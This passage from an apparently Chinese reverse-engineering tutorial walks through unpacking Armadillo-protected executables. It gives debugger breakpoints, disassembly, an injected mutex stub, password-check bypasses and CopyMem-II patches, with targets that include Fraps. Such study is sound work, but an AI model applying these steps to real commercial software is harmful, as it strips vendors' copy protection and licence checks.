 EB <span class="number">27</span>           jmp     short <span class="number">01007406</span></div><div class="line"><span class="number">010073DF</span>    <span class="number">83B9</span> <span class="number">84000000</span> <span class="number">0</span>&gt;cmp     dword ptr [ecx+<span class="number">84</span>], <span class="number">0E</span></div></pre></td></tr></table></figure><h3 id="0x2-2-单进程Armadillo-v4-x脱壳"><a href="#0x2-2-单进程Armadillo-v4-x脱壳" class="headerlink" title="0x2.2 单进程Armadillo v4.x脱壳"></a>0x2.2 单进程Armadillo v4.x脱壳</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先需要判断加壳版本是否是4.xxx。关于这点如何判断呢，主要下硬件断点 <code>HE OutputDebugStringA</code> 。在堆栈窗口出现%s%s%s%s的标志，说明这是4.X的壳。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0012</span>EC7<span class="number">0</span>   <span class="number">021</span>C580F  /CALL 到 OutputDebugStringA 来自 <span class="number">021</span>C5809</div><div class="line"><span class="number">0012</span>EC74   <span class="number">0012</span>F5E8  \String = <span class="string">"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于Armadillo v4.x单进程脱壳把握两点，<strong>第一，使用Magic_Jmp避过IAT加密保护，对GetCurrentThreadId下断点找到OEP</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于第一条，就是上面2.1讲的原则，下面解释第二条。首先对GetCurrentThreadId下断。<code>HE GetCurrentThreadId</code>。查看堆栈窗口，会出现如下结果.中间省略多个，查看关于GetCurrentThreadId都是来自其他模块的调用，但是最后一个是来自程序的调用。这就是程序返回的时机，所以，F8步过，根据之前说的规则，<strong>OEP在该程序段最后一个call ecx中。</strong><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">0236</span>FE50   <span class="number">7339352</span>D  /CALL 到 GetCurrentThreadId 来自 msvbvm60<span class="number">.73393527</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="number">0236</span>FE30   <span class="number">76</span>DE1434  /CALL 到 GetCurrentThreadId 来自 adsldpc<span class="number">.76</span>DE142E</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="number">0236</span>FE78   <span class="number">76</span>F31298  /CALL 到 GetCurrentThreadId 来自 wldap32<span class="number">.76</span>F31292</div><div class="line"><span class="comment">//....</span></div><div class="line"><span class="number">0012</span>F720   <span class="number">037560</span>EC  /CALL 到 GetCurrentThreadId 来自 <span class="number">037560E6</span></div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0376F70F    <span class="number">3350</span> <span class="number">40</span>         <span class="keyword">xor</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x40</span>]</div><div class="line">0376F712    <span class="number">3350</span> <span class="number">04</span>         <span class="keyword">xor</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x4</span>]</div><div class="line">0376F715    2BCA            <span class="keyword">sub</span> <span class="built_in">ecx</span>,<span class="built_in">edx</span></div><div class="line">0376F717    FFD1            <span class="keyword">call</span> <span class="built_in">ecx</span>                                 <span class="comment">; NOTEPAD_.004010CC</span></div><div class="line">0376F719    <span class="number">8945</span> E4         <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1C</span>],<span class="built_in">eax</span></div><div class="line">0376F71C    8B45 E4         <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1C</span>]</div><div class="line">0376F71F    8B4D F0         <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</div><div class="line">0376F722    <span class="number">64</span>:<span class="number">890D</span> <span class="number">0000000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">ecx</span></div><div class="line">0376F729    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></div><div class="line">0376F72A    5E              <span class="keyword">pop</span> <span class="built_in">esi</span></div><div class="line">0376F72B    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></div><div class="line">0376F72C    C9              <span class="keyword">leave</span></div><div class="line">0376F72D    C3              <span class="keyword">retn</span></div></pre></td></tr></table></figure><h3 id="2-3-加-PassWord单进程"><a href="#2-3-加-PassWord单进程" class="headerlink" title="2.3 加 PassWord单进程"></a>2.3 加 PassWord单进程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是就比2.2多了一个密码验证，我们直接绕过密码验证就好。首先Shift+F9运行，通过查看导入表，在GetDlgItem处下断<code>bpx GetDlgItem</code>。然后在输入伪码按OK，程序中断在35359D0处.<strong>注意：先运行，在下断！在输入</strong><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="number">035349</span>D0    FF15 E8645403   call    dword ptr [<span class="number">35464E8</span>]              ; USER32.GetDlgItem</div><div class="line"><span class="number">035349</span>D6    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">035349</span>D7    FF15 E0645403   call    dword ptr [<span class="number">35464E0</span>]              ; USER32.GetWindowTextA</div><div class="line"><span class="number">035349</span>DD    <span class="number">8</span>D85 <span class="number">00</span>FFFFFF   lea     eax, dword ptr [ebp<span class="number">-100</span>]</div><div class="line"><span class="number">035349E3</span>    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">035349E4</span>    E8 <span class="number">35060100</span>     call    <span class="number">0354501</span>E                         ; jmp 到 msvcrt.strlen</div><div class="line"><span class="number">035349E9</span>    <span class="number">85</span>C0            test    eax, eax</div><div class="line"><span class="number">035349</span>EB    <span class="number">59</span>              pop     ecx</div><div class="line"><span class="number">035349</span>EC    <span class="number">74</span> <span class="number">1</span>A           je      short <span class="number">03534</span>A08</div><div class="line"><span class="number">035349</span>EE    <span class="number">8</span>B0D E01E5503   mov     ecx, dword ptr [<span class="number">3551</span>EE0]</div><div class="line"><span class="number">035349</span>F4    <span class="number">8</span>D85 <span class="number">00</span>FFFFFF   lea     eax, dword ptr [ebp<span class="number">-100</span>]</div><div class="line"><span class="number">035349</span>FA    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">035349</span>FB    E8 <span class="number">7</span>D77FEFF     call    <span class="number">0351</span>C17D                         ; 比较原始密码</div><div class="line"><span class="number">03534</span>A00    <span class="number">84</span>C0            test    al, al</div><div class="line"><span class="number">03534</span>A02    <span class="number">74</span> <span class="number">04</span>           je      short <span class="number">03534</span>A08                   ; 不是原码，则跳转(不跳)</div><div class="line"><span class="number">03534</span>A04    <span class="number">6</span>A <span class="number">01</span>           push    <span class="number">1</span></div><div class="line"><span class="number">03534</span>A06    EB <span class="number">4</span>C           jmp     short <span class="number">03534</span>A54                   ; 回到正常流程</div><div class="line"><span class="number">03534</span>A08    <span class="number">33</span>F6            xor     esi, esi</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着修改魔法跳，可以使用<code>bp GetModueHandle</code>或者<code>HE GetModuleHandle</code>。这里发现了kernel32.dll就可以执行到返回查看了。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后就是找OEP，这里还是可以使用2.2中对GetProcessId下断。这里介绍个新方法。**可以在内存窗口.text段按F2下断点。因为壳执行完肯定会执行代码段的内容。也就是说代码段是由外壳到源程序的一扇门。所以在此处下断必然成立。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">004010</span>CC    <span class="number">55</span>               push    ebp</div><div class="line"><span class="number">004010</span>CD    <span class="number">8</span>BEC             mov     ebp, esp</div><div class="line"><span class="number">004010</span>CF    <span class="number">83</span>EC <span class="number">44</span>          sub     esp, <span class="number">44</span></div><div class="line"><span class="number">004010</span>D2    <span class="number">56</span>               push    esi</div><div class="line"><span class="number">004010</span>D3    FF15 E4634000    call    dword ptr [<span class="number">4063E4</span>]               ; kernel32.GetCommandLineA</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，现在有两个方法可以找OEP。<strong>第一是对GetProcessId下断，第二个就是在.text下断。</strong></p><h3 id="0x2-4-包含Code-Splicing和Import-Table-Elimination的修复"><a href="#0x2-4-包含Code-Splicing和Import-Table-Elimination的修复" class="headerlink" title="0x2.4 包含Code Splicing和Import Table Elimination的修复"></a>0x2.4 包含Code Splicing和Import Table Elimination的修复</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Armadillo使用Code Splicing和Import Table Elimination两项技术使得程序修复变得更加困难。幸好有大佬开发了ArmInline工具可以使得修复变得简单一些。注意：本节只将修复，不讲程序优化。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当我们寻找到OEP之后，就可以着手修复Code Splicing和Import Table Elimination了。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0040C434    <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">0040C435    8BEC            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">0040C437    6A FF           <span class="keyword">push</span> -<span class="number">0x1</span></div><div class="line">0040C439    <span class="number">68</span> <span class="number">28334100</span>     <span class="keyword">push</span> fraps<span class="meta">.00413328</span></div><div class="line">0040C43E    <span class="number">68</span> 30E94000     <span class="keyword">push</span> fraps<span class="meta">.0040E930</span></div><div class="line">0040C443    <span class="number">64</span>:A1 <span class="number">00000000</span>  <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]</div><div class="line">0040C449    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">0040C44A    <span class="number">64</span>:<span class="number">8925</span> <span class="number">0000000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">esp</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先祭上大杀器ArmInline，欲要善其事，必先利其器。需要我们填写的就是上述三个区域，不过我这个版本可以自动填写修复的数据，只需要知道我们需要修复的进程，如图，目标进程ID为FC4，选中后依次删除拼接代码和巡回IAT基址。<br>    <img src="https://i.loli.net/2019/05/01/5cc930d294e58.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后按照常规的方法dump和修复IAT就可以了。注意的是使用PELord一定要勾选<strong>从磁盘粘贴文件头(一般默认勾选上了)</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果你的ArmInline不能自己修复(反正牛逼的师傅都是自己修复的，我不牛逼所以都是软件自动修复的)，关于<strong>Code Splicing</strong>的修复可以这样，Alt+M到内存窗口，在fraps模块之后有一段内存没有被其他模块映射(不知道这样说对不对，反正对于Kernel32这样的dll来说肯定是对的。大家理解就好)。<strong>在最后一块内存处</strong>，就是拼接代码起点，这个值不是一个定值。(这个只是经验之谈，需要大佬解释一波的)<br>    <img src="https://i.loli.net/2019/05/01/5cc93414c84c5.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着修正IAT乱序，首先随便找个函数调用，在信息窗口点<code>数据窗口跟随地址</code>，然后向上拖动窗口(你最好改成<strong>显示地址</strong>)。找到IAT起始地址，然后找到结束地址，两者相减。计算大小即可。关于填充地址。可以考虑在一块没有读写的空白区域就好。不过大佬给的建议是在程序加壳前原来IAT的相近地方。可以这样寻找。Alt+M到内存窗口，因为IAT早rdata区域，又因为IAT肯定保存了一些IID成员，其中有个Name成员，也就是DllName。我们通过全局搜索确定<br>    <img src="https://i.loli.net/2019/05/01/5cc9396eea356.png" alt=""></p><h2 id="0x3-Armadillo双进程脱壳"><a href="#0x3-Armadillo双进程脱壳" class="headerlink" title="0x3 Armadillo双进程脱壳"></a>0x3 Armadillo双进程脱壳</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一章节主要讲穿山甲的双进程保护手段。所以双进程保护，简单的来说就是创建两个进程，一个进程是另外一个进程的调试进程，又由于在R3下面一个进程只能被一个调试器附加。这样可以有效避免程序被调试。</p><h3 id="0x3-1-标准保护"><a href="#0x3-1-标准保护" class="headerlink" title="0x3.1 标准保护"></a>0x3.1 标准保护</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来简单讲解一下关于双进程保护的原理，主要可以利用互斥体来判断进程列表是否存在相同的进程(即多开)。首先是利用CreateMutex创建一个互斥体。然后在利用OpenMutex打开那个互斥体，如果OpenMutex成功返回互斥体句柄，说明已经存在一个进程。如果不存在则在CreateProcess一个进程。而对于穿山甲壳双转单也是如此。<strong>如果提前创建了一个即将被打开的互斥体。那么程序就不会去创建新的进程。</strong>如下的脱壳方法就是基于这点考虑。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先对openMutex下断点(HE,bp皆可)。<code>HE openMutexA</code>,然后shift+F9。观察堆栈<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0012</span>F798   <span class="number">00434</span>DB8  /CALL 到 OpenMutexA 来自 NOTEPAD_<span class="number">.00434</span>DB2</div><div class="line"><span class="number">0012</span>F79C   <span class="number">001</span>F0001  |Access = <span class="number">1</span>F0001</div><div class="line"><span class="number">0012</span>F7A0   <span class="number">00000000</span>  |Inheritable = <span class="literal">FALSE</span></div><div class="line"><span class="number">0012</span>F7A4   <span class="number">0012</span>FDD8  \MutexName = <span class="string">"8A4::DABDC997F2"</span>   ；这是是重点，标记了互斥体名称。记住堆栈地址<span class="number">0012</span>FDD8，以后要用</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着需要创建互斥体。转到401000处编写汇编代码，为什么需要401000，因为这是.text段，但是理论上在哪里修改都可以。然后将EIP修改到401000处，就可以在这里执行了，然后shitf+F9.<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">00401000 </span>   <span class="number">60</span>                  pushad                    ;保存所有寄存器</div><div class="line"><span class="symbol">00401001 </span>   <span class="number">9</span>C                  pushfd                    ;保存标志寄存器</div><div class="line"><span class="symbol">00401002 </span>   <span class="number">68</span> F8FB1200         push <span class="number">0012</span>FDD8             ;堆栈里看到的值MutexName</div><div class="line"><span class="symbol">00401007 </span>   <span class="number">33</span>C0                <span class="keyword">xor</span> eax,eax</div><div class="line"><span class="symbol">00401009 </span>   <span class="number">50</span>                  push eax                  ;参数<span class="number">2</span></div><div class="line"><span class="number">0040100</span>A    <span class="number">50</span>                  push eax                  ;参数<span class="number">1</span></div><div class="line"><span class="number">0040100</span>B    E8 B5A6A577         <span class="keyword">call</span> kernel32.CreateMutexA  ；创建互斥体</div><div class="line"><span class="symbol">00401010 </span>   <span class="number">9D</span>                  popfd</div><div class="line"><span class="symbol">00401011 </span>   <span class="number">61</span>                  popad                      ;恢复</div><div class="line"><span class="symbol">00401012 </span> - E9 <span class="number">7</span>A13A677         jmp kernel32.OpenMutexA    ;打开互斥体</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着就是处理加密IAT和跳转OEP,DUMP的问题了。最后到达OEP如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">004010CC    <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">004010CD    8BEC            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">004010CF    83EC <span class="number">44</span>         <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0x44</span></div><div class="line">004010D2    <span class="number">56</span>              <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line">004010D3    FF15 E4634000   <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x4063E4</span>]             <span class="comment">; kernel32.GetCommandLineA</span></div><div class="line">004010D9    8BF0            <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div></pre></td></tr></table></figure><h3 id="0x3-2-CopyMem-II"><a href="#0x3-2-CopyMem-II" class="headerlink" title="0x3.2 CopyMem-II"></a>0x3.2 CopyMem-II</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;去除CopyMem-ll 保护通常有两个方法。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法1：首先寻找OEP，然后对WaitForDebugEvent下断点<code>bp WaitForDebugEvent</code>,接着运行程序，看堆栈，当出现<code>pDebugEvent</code>字符的时候，选择在数据窗口跟随，然后对WriteProcessMemory下断<code>bp WriteProcessMemory</code>，中断后，在数据窗口发现OEP。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里重点讲一下第二个方法：  </p><ul><li><p>bp WaitForDebugEvent，shift+F9运行起来，删除断点，然后执行到程序领空,大概停在0060F8BA</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0060F8BA   ?  <span class="number">15</span> E0406400   <span class="keyword">adc</span> <span class="built_in">eax</span>,&lt;&amp;KERNEL32.WaitForDebugEvent&gt;</div><div class="line">0060F8BF   .  85C0          <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">0060F8C1   .  0F84 2B270000 <span class="keyword">je</span> MAGCT.00611FF2</div><div class="line">0060F8C7   .  8B85 FCFDFFFF <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x204</span>]</div><div class="line">0060F8CD   .  <span class="number">25</span> FF000000   <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0xFF</span></div><div class="line">0060F8D2   .  85C0          <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">0060F8D4   .  <span class="number">74</span> <span class="number">13</span>         <span class="keyword">je</span> XMAGCT.0060F8E9</div><div class="line">0060F8D6   .  8B0D 44AF6400 <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x64AF44</span>]</div><div class="line">0060F8DC   .  <span class="number">8379</span> <span class="number">20</span> <span class="number">00</span>    <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x20</span>],<span class="number">0x0</span></div><div class="line">0060F8E0   .  <span class="number">74</span> <span class="number">07</span>         <span class="keyword">je</span> XMAGCT.0060F8E9</div><div class="line">0060F8E2   .  C685 FCFDFFFF&gt;<span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x204</span>],<span class="number">0x0</span></div><div class="line">0060F8E9   &gt;  <span class="number">68</span> 38AE6400   <span class="keyword">push</span> MAGCT.0064AE38                      <span class="comment">; /pCriticalSection = MAGCT.0064AE38</span></div><div class="line">0060F8EE   .  FF15 A4416400 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;KERNEL32.EnterCriti&gt;<span class="comment">; \EnterCriticalSection</span></div></pre></td></tr></table></figure></li><li><p>然后Ctrl+F搜索命令：<code>or eax，0FFFFFFF8</code>,想上看有两个比较，一个是cmp dword ptr ss:[ebp-0xA34],另外一个是cmp ecx,dword ptr ds:[0x64AF48]，然后对第一个cmp下断点，F9运行。这一步你需要记住以下内容，等下patch的时候需要用到内容，第一:第一个cmp的地址<code>0060FE43</code>,第二：第一个cmp【】内的值<code>ebp-0xA34</code>,第三：第二个cmp【】的值：<code>0x64AF48</code>.<strong>除此以外，需要将次一个cmp栈里面的数据清0</strong></p></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0060FE43   &gt; \83BD CCF5FFFF <span class="number">00</span>     <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>],<span class="number">0x0</span>         <span class="comment">;  3</span></div><div class="line">0060FE4A   .  0F8C A8020000        <span class="keyword">jl</span> MAGCT.006100F8                        <span class="comment">;在目的地址006100F8下断点</span></div><div class="line">0060FE50   .  8B8D CCF5FFFF        <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>]</div><div class="line">0060FE56   .  3B0D 48AF6400        <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x64AF48</span>]          <span class="comment">;  2</span></div><div class="line">0060FE5C   .  0F8D <span class="number">96020000</span>        <span class="keyword">jge</span> MAGCT.006100F8</div><div class="line">0060FE62   .  8B95 40F6FFFF        <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x9C0</span>]</div><div class="line">0060FE68   .  81E2 FF000000        <span class="keyword">and</span> <span class="built_in">edx</span>,<span class="number">0xFF</span></div><div class="line">0060FE6E   .  85D2                 <span class="keyword">test</span> <span class="built_in">edx</span>,<span class="built_in">edx</span></div><div class="line">0060FE70   .  0F84 AD000000        <span class="keyword">je</span> MAGCT.0060FF23</div><div class="line">0060FE76   .  6A <span class="number">00</span>                <span class="keyword">push</span> <span class="number">0x0</span></div><div class="line">0060FE78   .  8BB5 CCF5FFFF        <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>]</div><div class="line">0060FE7E   .  C1E6 <span class="number">04</span>              <span class="keyword">shl</span> <span class="built_in">esi</span>,<span class="number">0x4</span></div><div class="line">0060FE81   .  8B85 CCF5FFFF        <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>]</div><div class="line">0060FE87   .  <span class="number">25</span> <span class="number">07000080</span>          <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0x80000007</span></div><div class="line">0060FE8C   .  <span class="number">79</span> <span class="number">05</span>                <span class="keyword">jns</span> XMAGCT.0060FE93</div><div class="line">0060FE8E   .  <span class="number">48</span>                   <span class="keyword">dec</span> <span class="built_in">eax</span></div><div class="line">0060FE8F   .  83C8 F8              <span class="keyword">or</span> <span class="built_in">eax</span>,<span class="number">0xFFFFFFF8</span>                        <span class="comment">;  1</span></div><div class="line">0060FE92   .  <span class="number">40</span>                   <span class="keyword">inc</span> <span class="built_in">eax</span></div></pre></td></tr></table></figure><ul><li><p>接下来patch数据，我们向下看，找到<code>add eax,0xff</code>语句，在这里就可以patch了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">//原始数据</div><div class="line">0060FF16      <span class="number">25</span> FF000000          <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0xFF</span>                             <span class="comment">;  patch</span></div><div class="line">0060FF1B      85C0                 <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">0060FF1D      0F84 D5010000        <span class="keyword">je</span> MAGCT.006100F8</div><div class="line">0060FF23      <span class="number">837D</span> D8 <span class="number">00</span>           <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x28</span>],<span class="number">0x0</span></div><div class="line">0060FF27      <span class="number">75</span> <span class="number">27</span>                <span class="keyword">jnz</span> XMAGCT.0060FF50</div><div class="line">0060FF29      8B15 D0436400        <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x6443D0</span>]</div><div class="line">//</div><div class="line">//patch模块</div><div class="line"><span class="keyword">inc</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>：[] //第一个<span class="keyword">CMP</span>内的值</div><div class="line"><span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[XXXX+<span class="number">4</span>],<span class="number">1</span>  //XXXX为第二个<span class="keyword">CMP</span>[]内的值</div><div class="line"><span class="keyword">jmp</span> XXXX  //第一个<span class="keyword">CMP</span>前的地址</div><div class="line">//</div><div class="line">//patch后的数据</div><div class="line">0060FF16      FF85 CCF5FFFF        <span class="keyword">inc</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>]             <span class="comment">;  patch</span></div><div class="line">0060FF1C      C705 4CAF6400 <span class="number">010000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x64AF4C</span>],<span class="number">0x1</span></div><div class="line">0060FF26    ^ E9 18FFFFFF          <span class="keyword">jmp</span> MAGCT.0060FE43</div><div class="line">0060FF2B      <span class="number">90</span>                   <span class="keyword">nop</span></div><div class="line">0060FF2C      <span 